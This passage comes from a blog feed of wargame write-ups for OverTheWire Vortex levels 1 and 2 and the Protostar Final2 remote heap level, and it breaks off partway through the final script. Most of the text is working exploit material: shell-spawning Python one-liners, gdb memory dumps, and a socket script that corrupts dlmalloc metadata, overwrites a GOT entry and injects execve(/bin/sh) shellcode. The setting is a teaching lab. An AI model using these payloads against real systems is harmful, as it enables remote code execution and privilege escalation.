sense because the compiler on more modern systems will put buffers after other variables to protect
against buffer overflows.</p>

<p>Question: why is the size of <code>ptr</code> only 4 bytes? I thought on 64-bit systems pointer variables are 8
bytes not 4 since memory should be 64-bit- or 8-byte-addressable?</p>

<p>We set a breakpoint at the <code>getchar()</code> call and run the program. Examine the first 64 words of <code>esp</code>
in hexadecimal.</p>

<pre><code>(gdb) break *main+206
Breakpoint 1 at 0x804868e

(gdb) run
Starting program: /vortex/vortex1

Breakpoint 1, 0x0804868e in main ()

(gdb) x/64wx $esp
0xffffd4c0: 0xf7e303b4  0xf7fd81a8  0x00000000  0xf7fec4a8
0xffffd4d0: 0x00000007  0xffffd5dc  0x00000001  0x00000000
0xffffd4e0: 0x00000001  0xf7fd81a8  0xf7ffd000  0xf7fe6d3b
0xffffd4f0: 0xf7ffc000  0x00001000  0x00000001  0xf7fe6cfc
0xffffd500: 0xf7ffd000  0x00000000  0xffffd5c8  0xf7fe724b
0xffffd510: 0xf7ffdaf0  0xf7fd8760  0x00000001  0x00000001
0xffffd520: 0x00000000  0xf7ff578c  0x00000000  0x00000000
0xffffd530: 0xf7ffd55c  0xffffd598  0xffffd5b8  0x00000000
0xffffd540: 0xf7ff578c  0xf7ffd55c  0xffffd5b8  0xf7fdc4ac
0xffffd550: 0xf7fdc2dc  0xf7fe4f3d  0xf7e36061  0x080482ff
0xffffd560: 0x00000000  0xf7fdc33c  0x00000000  0xf7fdc000
0xffffd570: 0x00000040  0x00000002  0x0804827d  0xf7ffdc24
0xffffd580: 0xf7e226bc  0xf7ffd000  0xf7e26cc4  0x00000001
0xffffd590: 0xf7fd8460  0xf7fe5694  0x00000000  0x00000000
0xffffd5a0: 0x00000000  0x00000000  0xf7fd8460  0x00000003
0xffffd5b0: 0xffffd5e0  0x07b1ea71  0xf63d4e2e  0xf7e26ed4
</code></pre>

<p><code>ptr</code> is located at <code>$esp + 0x14 = 0xffffd4d4</code> which is initialized with a value of <code>0xffffd5dc</code>.
Since ASLR is disabled, this location is fixed.</p>

<p>I first thought of a brute-force strategy of decrementing <code>ptr</code>&rsquo;s value with <code>\</code> until its highest
byte was <code>0xca</code>. That way, when it&rsquo;s bit-wise ANDed with <code>0xff000000</code>, the result would be
<code>0xca000000</code>. The exploit would be the following.</p>

<pre><code>(python -c 'import sys; sys.stdout.write("\\" * (0xffffe470 - 0xcaffffff) + "\x00")'; cat) \
  | /vortex/vortex1

id
uid=5002(vortex2) gid=5001(vortex1) groups=5002(vortex2),5001(vortex1)

cat /etc/vortex_pass/vortex2
23anbT\rE
</code></pre>

<p>Aside: the Python command is run in a subshell with an extra <code>cat</code> to keep the <code>/bin/sh</code> listening
to more input from the stdout of that subshell. That way we can add more commands from the
terminal. The Python command triggers the <code>/bin/sh</code>. The <code>cat</code> with no args just reads from the
current stdin and feeds data to <code>/bin/sh</code>. See this <a href="https://security.stackexchange.com/a/155845/4350">Stack Exchange answer</a>.</p>

<p>This is definitely not the best solution because 0xffffd5dc - 0xcaffffff = 0x34ffd5dd =
889,181,661. If written to disk, this file would be almost a gigabyte.</p>

<p>Let&rsquo;s think of a better solution. There&rsquo;s no lower bound checking on <code>ptr</code>&rsquo;s value. So we can
decrement the value of <code>ptr</code> until it references its own memory address which starts at <code>0xffffd4d4</code>.
Then we write <code>0xca</code> into the highest byte at <code>0xffffd4d7</code>. <code>ptr</code>&rsquo;s value is initialized to
<code>0xffffd5dc</code>. So we write this many <code>\</code>: 0xffffd5dc - 0xffffd4d7 = 0x105 = 261. Instead of the
seemingly arbitrary 261, we&rsquo;ll use 512/2 + 5. This is more descriptive because it shows we&rsquo;re moving
the <code>ptr</code> reference from where it starts in the middle of <code>buf[512]</code> back to the beginning and then
past the <code>x</code> and one byte into itself.</p>

<pre><code>(python -c 'import sys; sys.stdout.write("\\" * (512/2 + 5) + "\xca" + "A")'; cat) \
  | /vortex/vortex1

id
uid=5002(vortex2) gid=5001(vortex1) groups=5002(vortex2),5001(vortex1)
</code></pre>

<p>Now that we have a shell as vortex2, we can read the password to advance to the next level.</p>

<pre><code>ls /etc/vortex_pass
vortex0   vortex11  vortex14  vortex17  vortex2   vortex22  vortex25  vortex5  vortex8
vortex1   vortex12  vortex15  vortex18  vortex20  vortex23  vortex3   vortex6  vortex9
vortex10  vortex13  vortex16  vortex19  vortex21  vortex24  vortex4   vortex7

cat /etc/vortex_pass/vortex2
23anbT\rE
</code></pre>

<h1><a href="https://overthewire.org/wargames/vortex/vortex2.html">Vortex Level 2 -> Level 3</a></h1>

<p><details>
  <summary>Hint 1: number of args</summary>
  You don&rsquo;t need to use all the available <code>argv</code> slots used in the executable.
</details></p>

<p><details>
  <summary>Hint 2: <code>$$</code></summary>
  What is <code>$$</code>? What is its value in the context of the executable?
</details></p>

<p><details>
  <summary>Hint 3: file to tar</summary>
  What file do you need to read? How can you use the program to read it?
</details></p>

<h2>My solution</h2>

<pre><code>vortex2@vortex:~$ /vortex/vortex2 /etc/vortex_pass/vortex3
/bin/tar: Removing leading `/' from member names

vortex2@vortex:/etc/vortex_pass$ ls -ail /tmp/ownership.$$.tar
ls: cannot access /tmp/ownership.1657.tar: No such file or directory

vortex2@vortex:~$ ls -ail /tmp/ownership.\$$.tar
2670 -rw-rw-r-- 1 vortex3 vortex2 10240 Dec 26 21:15 /tmp/ownership.$$.tar

vortex2@vortex:~$ tar -xvf /tmp/ownership.\$$.tar
etc/vortex_pass/vortex3

vortex2@vortex:~$ ls -ail etc/vortex_pass/
total 12
2808 drwxrwxr-x 2 vortex2 vortex2 4096 Dec 26 21:16 .
2689 drwxrwxr-x 3 vortex2 vortex2 4096 Dec 26 21:16 ..
2809 -r-------- 1 vortex2 vortex2   10 Nov  4  2019 vortex3

vortex2@vortex:~$ cat etc/vortex_pass/vortex3
64ncXTvx#
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My Solution to Exploit Exercises Protostar Final2 Level]]></title>
    <link href="https://www.davidxia.com/2020/11/my-solution-to-exploit-exercises-protostar-final2-level/"/>
    <updated>2020-11-01T17:46:32-05:00</updated>
    <id>https://www.davidxia.com/2020/11/my-solution-to-exploit-exercises-protostar-final2-level</id>
    <content type="html"><![CDATA[<p>This is an explanation of <a href="https://exploit-exercises.lains.space/protostar/final2/">Protostar level Final2</a>. I wrote a solution in April without an
explanation. I read it last night and had to spend half a day to understand it again. So next time
I&rsquo;ll write the explanation while it&rsquo;s still fresh in my head.</p>

<p>The level&rsquo;s description is</p>

<p>{% blockquote %}
Remote heap level :)
Core files will be in /tmp.
This level is at /opt/protostar/bin/final2
{% endblockquote %}</p>

<!-- more -->


<p>This is the source code.</p>

<pre><code class="c">#include "../common/common.c"
#include "../common/malloc.c"

#define NAME "final2"
#define UID 0
#define GID 0
#define PORT 2993

#define REQSZ 128

void check_path(char *buf)
{
  char *start;
  char *p;
  int l;

  /*
  * Work out old software bug
  */

  p = rindex(buf, '/');
  l = strlen(p);
  if(p) {
      start = strstr(buf, "ROOT");
      if(start) {
          while(*start != '/') start--;
          memmove(start, p, l);
          printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start &lt; buf ?
          "yes" : "no", start - buf);
      }
  }
}

int get_requests(int fd)
{
  char *buf;
  char *destroylist[256];
  int dll;
  int i;

  dll = 0;
  while(1) {
      if(dll &gt;= 255) break;

      buf = calloc(REQSZ, 1);
      destroylist[dll] = buf; /* Line is missing in original source. gdb disassemble will show it. */
      if(read(fd, buf, REQSZ) != REQSZ) break;

      if(strncmp(buf, "FSRD", 4) != 0) break;

      check_path(buf + 4);     

      dll++;
  }

  for(i = 0; i &lt; dll; i++) {
                write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 

  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  get_requests(fd);

}
</code></pre>

<h2>Overview of source code</h2>

<p>The first line of the description coupled with the fact the code listens on port 2993 means we&rsquo;ll
have to send a TCP packet that exploits a heap related vulnerability. <code>main()</code> is pretty simple. It
runs the final2 binary in the background as root and processes requests with <code>get_requests()</code>.
<code>get_requests()</code> declares an array of 256 char pointers and reads input strings into it. If any
request size isn&rsquo;t <code>REQSZ</code> or 128 bytes, the function breaks out of the <code>while(1)</code> loop. Any request
payload that doesn&rsquo;t start with <code>FSRD</code> also breaks out of the loop. The <code>check_path()</code> function is
then called and <code>dll</code> is incremented. A for-loop writes &ldquo;Process OK&rdquo; to stdout and frees each string
buffer starting with the oldest.</p>

<p><code>check_path()</code> stores a pointer to <code>buf</code>&rsquo;s right-most <code>/</code> in <code>p</code>. <code>l</code> is the length of the string
starting from <code>p</code>. If <code>p</code> is greater than 0, <code>start</code> points to the part of <code>buf</code> that has <code>"ROOT"</code>.
If <code>"ROOT"</code> is a substring in <code>buf</code>, the while loop decrements <code>start</code> until it finds a <code>/</code>. Then
<code>memmove()</code> moves <code>l</code> bytes of the string starting at <code>p</code> to <code>start</code>.</p>

<p>A TCP packet with the string <code>FSRD/ROOT/AAAA</code> will cause <code>p</code> to point to the second <code>/</code>. So <code>p</code> as a
string is <code>/AAAA</code>. <code>l</code> is 5. <code>start</code> initially points to the <code>R</code> in <code>ROOT</code> and later is decremented
to point to the first <code>/</code>. <code>memmove()</code> changes the string to <code>FSRD/AAAA/AAAA</code>.</p>

<p>Notice that <code>start--</code> doesn&rsquo;t check the bounds of the string passed in by <code>buf</code>. It will keep
scanning leftward until it finds some <code>/</code>. So <code>memmove()</code> can write to memory outside of the current
string.</p>

<h2>General Exploit Strategy</h2>

<p>We know we&rsquo;ll need to exploit the <code>free()</code> call which in this series of exercises uses the
vulnerable dlmalloc <code>unlink()</code> macro. In a <a href="/2020/04/how-to-exploit-dlmalloc-unlink/?asdf">previous post</a>, I showed how this exploit
manipulates heap memory to redirect code execution. We&rsquo;ll need to inject <a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a> via the request
payloads. Our request payloads also need to corrupt heap memory in a way that will trick dlmalloc
into redirecting code to the shellcode.</p>

<h2>Exploiting <code>memmove()</code></h2>

<p>Let&rsquo;s craft a first payload that will allow the second payload to overwrite heap memory before the
start of the second string. <code>FSRDAAAA...AAAA/AAAA</code> should work. The second payload can be
<code>FSRDROOTAAA...AAAA/BBBB</code>. After the second call to <code>check_path()</code>, the heap memory of the first
string should be <code>FSRDAAAA...AAAA/BBBB</code>. Let&rsquo;s confirm this with a Python script and <code>gdb</code>. We&rsquo;ll
set a breakpoint right after the call to <code>check_path()</code> and send these two strings.</p>

<p>We save the following contents to a file named <code>test.py</code>.</p>

<pre><code class="python">#!/usr/bin/env python

import socket
import sys

HOST = sys.argv[1]
PORT = 2993
REQSZ = 128

# Establish TCP connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

payload1 = 'FSRD' + 'A' * (REQSZ - 4 - 5) + '/' + 'AAAA'  # 'FSRDAAAA.../AAAA'
s.sendall(bytes(payload1, 'ascii'))

payload2 = 'FSRD' + 'ROOT' + 'A' * (REQSZ - 8 - 5) + '/' + 'BBBB'  # 'FSRDROOTAAAA.../BBBB'
s.sendall(bytes(payload2, 'ascii'))

# Terminate session by sending a payload that causes get_requests() to return
s.sendall(bytes('AAAA', 'ascii'))

data = s.recv(1024)
print(data.decode('ascii'))  # print the confirmation

s.close()
</code></pre>

<p>I&rsquo;m running the Protostar VM on Virtualbox on a Macbook. Set the network settings for the VM to
Host-only Adapter. Once the VM starts, use the Virtualbox &ldquo;Show&rdquo; button to get a terminal to the VM.
Login as <code>user</code> with password <code>user</code>. Run <code>ip addr show</code> to find the VM&rsquo;s local IP address. Mine is
<code>192.168.99.107</code>. I then close the Virtualbox terminal because I like to use iTerm. I SSH with iTerm
into the VM as root with password <code>godmode</code>. We need to be root in order to attach gdb to a running
process.</p>

<pre><code>ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@192.168.99.107
</code></pre>

<p>You can see final2 is already running. We get the PID.</p>

<pre><code>root@protostar:/# ps aux | grep final2
root      1495  0.0  0.2   1544   284 ?        Ss   10:44   0:00 /opt/protostar/bin/final2
</code></pre>

<p>Now attach gdb to it. Since the program forks a new child process to handle requests, we <code>set follow-fork-mode child</code> to make gdb follow the child process instead of the parent. <code>set detach-on-fork off</code> makes gdb hold control of both parent and child (I&rsquo;m not sure if this is necessary). The other two gdb settings are my personal preferences.</p>

<pre><code>root@protostar:/# gdb /opt/protostar/bin/final2 -p 1495

GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
Reading symbols from /opt/protostar/bin/final2...done.
Attaching to program: /opt/protostar/bin/final2, process 1495
Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/libc.so.6
Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
accept () at ../sysdeps/unix/sysv/linux/i386/socket.S:64
64  ../sysdeps/unix/sysv/linux/i386/socket.S: No such file or directory.
    in ../sysdeps/unix/sysv/linux/i386/socket.S

(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) set disassembly-flavor intel
(gdb) set pagination off
</code></pre>

<p>Disassemble <code>get_requests()</code> to find where <code>check_path()</code> returns.</p>

<pre><code>(gdb) disassemble get_requests
Dump of assembler code for function get_requests:
0x0804bd47 &lt;get_requests+0&gt;:    push   ebp
0x0804bd48 &lt;get_requests+1&gt;:    mov    ebp,esp
...
0x0804bdce &lt;get_requests+135&gt;:  mov    DWORD PTR [esp],eax
0x0804bdd1 &lt;get_requests+138&gt;:  call   0x804bcd0 &lt;check_path&gt;
0x0804bdd6 &lt;get_requests+143&gt;:  jmp    0x804bd57 &lt;get_requests+16&gt;
0x0804bddb &lt;get_requests+148&gt;:  nop
...
0x0804be25 &lt;get_requests+222&gt;:  ret
End of assembler dump.

(gdb) break *get_requests+143
Breakpoint 1 at 0x804bdd6: file final2/final2.c, line 51.
(gdb) c
Continuing.
</code></pre>

<p>Now run our Python script in another terminal to send the strings.</p>

<pre><code>python test.py 192.168.99.107
</code></pre>

<p>Our gdb terminal will show the following.</p>

<pre><code>[New process 2322]
[Switching to process 2322]

Breakpoint 1, get_requests (fd=4) at final2/final2.c:51
51  final2/final2.c: No such file or directory.
    in final2/final2.c
Current language:  auto
The current source language is "auto; currently c".
</code></pre>

<p>Print <code>buf</code> to show the address it points to. Then examine the first 40 DWORDs in hexadecimal
starting at address <code>0x804e000</code> (<code>0x804e008 - 0x8</code> so we can see the first heap chunk&rsquo;s metadata in
the previous 8 bytes). We can see its <code>FSRD</code> (<code>0x44525346</code>) followed by lots of <code>A</code>s (<code>0x41</code>s) and
ends in <code>/AAAA</code>.</p>

<pre><code>(gdb) p buf
$1 = 0x804e008 "FSRD", 'A' &lt;repeats 119 times&gt;, "/AAAA"

(gdb) x/40wx 0x804e000
0x804e000:  0x00000000  0x00000089  0x44525346  0x41414141
0x804e010:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e020:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e030:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e040:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e050:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e060:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e070:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e080:  0x2f414141  0x41414141  0x00000000  0x00000f79
0x804e090:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>We continue and examine the memory of the first chunk again. We expect the memory at address
<code>0x804e084</code> to be <code>BBBB</code> or <code>0x42424242</code> which it is.</p>

<pre><code>(gdb) c
Continuing.

Breakpoint 1, get_requests (fd=4) at final2/final2.c:51
51  in final2/final2.c

(gdb) x/40wx 0x804e000
0x804e000:  0x00000000  0x00000089  0x44525346  0x41414141
0x804e010:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e020:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e030:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e040:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e050:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e060:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e070:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e080:  0x2f414141  0x42424242  0x00000000  0x00000089
0x804e090:  0x44525346  0x544f4f52  0x41414141  0x41414141
</code></pre>

<h2>Exploiting <code>free()</code></h2>

<p>With the ability to overwrite bytes following a strategically placed <code>/</code> character in the previous
heap chunk, we can perform a classic heap overflow exploit using the <code>unlink()</code> technique. We can&rsquo;t
overwrite the first chunk&rsquo;s heap metadata because there&rsquo;s no way to insert a <code>/</code> before it. So we
target the second chunk&rsquo;s heap metadata. I&rsquo;m now going to rehash some of the dlmalloc algorithm
explained in my <a href="/2020/04/how-to-exploit-dlmalloc-unlink/?asdf">previous post</a> because it can be a little confusing.</p>

<p>When the first chunk is freed, <code>unlink()</code> will run on the second chunk if the second chunk has
already been freed. dlmalloc determines if the second chunk is freed by checking the third chunk&rsquo;s
<code>PREV_INUSE</code> bit which is the lowest bit of the second byte of the chunk. In order to find the start
of the third chunk, dlmalloc adds the value of the chunk&rsquo;s second DWORD bitmasked with 0x1 (i.e.
ignoring the lowest bit) to the chunk&rsquo;s starting address. So in the above memory dump, the
start of the second chunk is <code>0x00000089 &amp;0x1 + 0x804e000 = 0x804e088</code>. Likewise, the start of the
third chunk is <code>0x00000089 &amp;0x1 + 0x804e088 = 0x804e110</code>. So we have to figure out a way to write
arbitrary bytes to the third chunk.</p>

<p>But we&rsquo;re already writing arbitrary bytes to the second chunk&rsquo;s metadata. Is there way to make
dlmalloc think the third chunk starts somewhere in memory where we&rsquo;re already writing bytes for the
second chunk? Nothing in dlmalloc checks the third chunk is actually right after the second.
dlmalloc just blindly performs an addition on two numbers. One of these numbers is the second
chunk&rsquo;s size which we can set via the <code>memmove()</code> bug. Let&rsquo;s make dlmalloc think the third chunk is
actually four bytes before the start of the second chunk. The second chunk is at <code>0x804e088</code> so the
&ldquo;virtual&rdquo; third chunk will be at <code>0x804e084</code>. What number added to <code>0x804e088</code> equals <code>0x804e084</code>?
-4. [Integer overflow] means adding <code>0xfffffffc</code> is the same as adding -4 (<code>0x804e088 + 0xfffffffc =
0x804e084</code>). So the second chunk&rsquo;s second DWORD representing its size must be <code>0xfffffffc</code>, and the
<code>PREV_INUSE</code> bit of the third chunk must be 0. <code>0xfffffffc 0xfffffffc</code> will work.</p>

<p>Once we fool dlmalloc into thinking the second chunk is already freed, dlmalloc will <code>unlink()</code> it.
So we need to craft values for the second chunk&rsquo;s forwards and backwards pointers such that
<code>unlink()</code> will redirect code execution to another region of memory where we can insert shellcode.</p>

<p>In the Heap3 level we overwrote the address of a function in the procedure linkage table (PLT) with
the address of shellcode. We can do the same here. Since we send two packets, <code>dll</code> will be 2. The
for-loop will call <code>write()</code> twice. The first <code>free()</code> will overwrite <code>write()</code>&rsquo;s address in the
PLT. Let&rsquo;s find the PLT address containing the address of <code>write()</code>. We <code>disassemble get_requests</code>,
examine the address <code>0x8048dfc</code> as an instruction to get the address in the global offset table
(GOT) that points to the dynamically linked library containing the actual <code>write()0</code> function. We
want to overwrite the contents of <code>0x804d41c</code> with the address of our shellcode. Since <code>unlink()</code>
adds 12 to the forwards pointer, we need to make the forward pointer <code>0x804d41c - 12</code>.</p>

<pre><code>disassemble get_requests

Dump of assembler code for function get_requests:
...
0x0804be01 &lt;get_requests+186&gt;:  call   0x8048dfc &lt;write@plt&gt;
...
End of assembler dump.

(gdb) x/i 0x8048dfc
0x8048dfc &lt;write@plt&gt;:  jmp    DWORD PTR ds:0x804d41c

(gdb) x/x 0x804d41c
0x804d41c &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0xb7f53c70
</code></pre>

<h2>Crafting Malicious Packets</h2>

<p>Where should we put our shellcode? We can include it in our first request. The first two DWORDs will
be clobbered by dlmalloc when it sets the first chunk&rsquo;s forwards and backwards pointers. The first
word needs to be used for <code>FSRD</code> anyways. So let&rsquo;s put shellcode at <code>0x804e010</code>. This address will
be our backwards pointer.</p>

<p>To summarize, this is how the packets should look so far.</p>

<p>The first payload must start with <code>FSRD</code>. Then we need four bytes of filler bytes <code>AAAA</code> followed by
shellcode (TBD). The last byte must be <code>/</code> for <code>memmove()</code>. The payload must be 128 bytes. The
spaces in the payload visualization below are just for readability. They shouldn&rsquo;t be in the actual
payload.</p>

<pre><code>FSRD AAAA &lt;shellcode&gt; AAAA ... AAA/
</code></pre>

<p>The second payload must start with <code>FSRDROOT</code>. Then have <code>0xfffffffc 0xfffffffc</code>. Then the forward
pointer <code>0x804d41c - 12</code> and backward pointer <code>0x804e010</code>. The whole payload must again be 128
bytes. We can just fill with <code>A</code>s.</p>

<pre><code>FSRD ROOT 0xfffffffc 0xfffffffc 0x804d41c - 12 0x804e010 AAAA ... AAAA
</code></pre>

<p>Before we craft shellcode, let&rsquo;s confirm the exploit will redirect code execution to the proposed
shellcode address. Instead of using actual shellcode, we&rsquo;ll use four bytes of <code>0xcc</code> which is a
one-byte x86 instruction called <a href="https://en.wikipedia.org/wiki/INT_(x86_instruction)"><code>INT3</code></a> that causes the processor to halt the process for any
attached debuggers. If we hit this opcode, our attached gdb debugger receive the <code>SIGTRAP</code> signal.
Let&rsquo;s test with the below Python script.</p>

<pre><code class="python">import socket
import struct
import sys
import telnetlib


REQSZ = 128
HOST = sys.argv[1]
PORT = 2993

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

shellcode = b'\xcc\xcc\xcc\xcc'


ba = bytearray(bytes('FSRDAAAA', 'ascii'))
ba.extend(shellcode)
ba = ba.ljust(REQSZ, b'\x41')
ba[-1] = ord('/')
s.sendall(ba)

ba = bytearray(bytes('FSRDROOT/', 'ascii'))
# Use integer overflow to make dlmalloc think third chunk is 4 bytes before second chunk.
ba.extend(struct.pack('I', 0xfffffffc) + struct.pack('I', 0xfffffffc))
# Add forward and backward pointers
ba.extend(struct.pack('I', 0x804d41c - 12) + struct.pack('I', 0x804e010))
ba = ba.ljust(REQSZ, b'\x41')
s.sendall(ba)

t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>Attach gdb to the <code>final2</code> process again.</p>

<pre><code>ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@192.168.99.107

root@protostar:/# gdb /opt/protostar/bin/final2 -p 1495
...

(gdb) set follow-fork-mode child
Current language:  auto
The current source language is "auto; currently asm".
(gdb) set detach-on-fork off
(gdb) set disassembly-flavor intel
(gdb) set pagination off
</code></pre>

<p>Set a breakpoint at the call to <code>write()</code>.</p>

<pre><code>(gdb) break *get_requests+186
Breakpoint 1 at 0x804be01: file final2/final2.c, line 54.
(gdb) c
Continuing.
</code></pre>

<p>Run the Python script in another terminal. Hit enter to send a third packet that&rsquo;s less than 128
bytes to break out of the <code>while(1)</code> loop.</p>

<pre><code>python final2.py 192.168.99.107
&lt;enter&gt;
Process OK
</code></pre>

<p>The gdb session should hit the breakpoint at <code>write()</code>.</p>

<pre><code>[New process 2622]
[Switching to process 2622]

Breakpoint 1, 0x0804be01 in get_requests (fd=4) at final2/final2.c:54
54  final2/final2.c: No such file or directory.
    in final2/final2.c
Current language:  auto
The current source language is "auto; currently c".
</code></pre>

<p>Examine the first 80 DWORDs. Continue and examine again.</p>

<pre><code>(gdb) x/80wx 0x804e000
0x804e000:  0x00000000  0x00000089  0x44525346  0x41414141
0x804e010:  0xcccccccc  0x41414141  0x41414141  0x41414141
0x804e020:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e030:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e040:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e050:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e060:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e070:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e080:  0x41414141  0x2f414141  0xfffffffc  0xfffffffc
0x804e090:  0x0804d410  0x0804e014  0x41414141  0x41414141
0x804e0a0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e0b0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e0c0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e0d0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e0e0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e0f0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e100:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e110:  0x00000000  0x00000089  0x0000000a  0x00000000
0x804e120:  0x00000000  0x00000000  0x00000000  0x00000000
0x804e130:  0x00000000  0x00000000  0x00000000  0x00000000

(gdb) c
Continuing.
Breakpoint 1, 0x0804be01 in get_requests (fd=4) at final2/final2.c:54
54  in final2/final2.c

(gdb) x/80wx 0x804e000
0x804e000:  0x00000000  0x00000085  0x0804d534  0x0804d534
0x804e010:  0xcccccccc  0x41414141  0x0804d410  0x41414141
0x804e020:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e030:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e040:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e050:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e060:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e070:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e080:  0x41414141  0x00000084  0xfffffffc  0xfffffffc
0x804e090:  0x0804d410  0x0804e014  0x41414141  0x41414141
0x804e0a0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e0b0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e0c0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e0d0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e0e0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e0f0:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e100:  0x41414141  0x41414141  0x41414141  0x41414141
0x804e110:  0x00000000  0x00000089  0x0000000a  0x00000000
0x804e120:  0x00000000  0x00000000  0x00000000  0x00000000
0x804e130:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>Memory at <code>0x804e008</code> and <code>0x804e00c</code> have been changed (to addresses before the heap. I guess
because it&rsquo;s some special value for the first chunk). Our INT3 instruction is at <code>0x804e010</code>. Let&rsquo;s
look at the GOT entry for <code>write()</code>.</p>

<pre><code>(gdb) x/i 0x8048dfc
0x8048dfc &lt;write@plt&gt;:  jmp    DWORD PTR ds:0x804d41c

(gdb) x/x 0x804d41c
0x804d41c &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x0804e014
</code></pre>

<p>Its value is the location of our INT3. This means the next call to <code>write()</code> will redirect code
execution to our INT3 which should cause gdb to break again.</p>

<pre><code>(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0x0804e011 in ?? ()
</code></pre>

<p>It worked!</p>

<h2>Crafting the Shellcode</h2>

<p>So now all we have to is insert some real shellcode that&rsquo;ll own the system. Since final2 is running
as <code>root</code>, let&rsquo;s make the process start a shell. This will allow us send arbitrary commands over TCP
that get executed as root, i.e. remote code execution. <a href="http://shell-storm.org/shellcode/">Shellstorm</a> has a great library of
shellcodes. Let&rsquo;s use <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">&ldquo;Linux/x86 - execve(/bin/sh) - 28 bytes&rdquo;</a>. But we have a
problem. <code>unlink()</code> overwrites the memory at <code>0x804e018</code> (it&rsquo;ll always overwrite four bytes of
memory eight bytes ahead of whatever address we pick), and no useful shellcode is short enough to
fit into eight bytes. What can we do?</p>

<p>If the shellcode could only jump past <code>0x804e018</code> to <code>0x804e01c</code> where we have a huge piece of
contiguous memory. Luckily the <code>jmp</code> instruction (<code>\xeb</code>) does exactly this. Its argument is how many
bytes to jump over. So our shellcode can start with <code>0xeb 0x0a</code> which moves the instruction pointer
10 bytes forward. We fill in the middle 10 bytes with <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/nop"><code>nop</code></a>s (<code>0x90</code>). Our final script will
be this.</p>

<pre><code>import socket
import struct
import sys
import telnetlib


REQSZ = 128
HOST = sys.argv[1]
PORT = 2993

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Two bytes for "jmp 0x0c", two bytes of nop padding to fill out the word,
# eight more nop bytes (second nop DWORD will be clobbered by unlink()),
# then actual shellcode from http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = b'\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90' \
            b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69' \
            b'\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31' \
            b'\xc0\x40\xcd\x80'

# These eight bytes will be overwritten by unlink().
ba = bytearray(bytes('FSRDAAAA', 'ascii'))
ba.extend(shellcode)
ba = ba.ljust(REQSZ, b'\x41')
# Set the last byte to a '/' for memmove().
ba[-1] = ord('/')
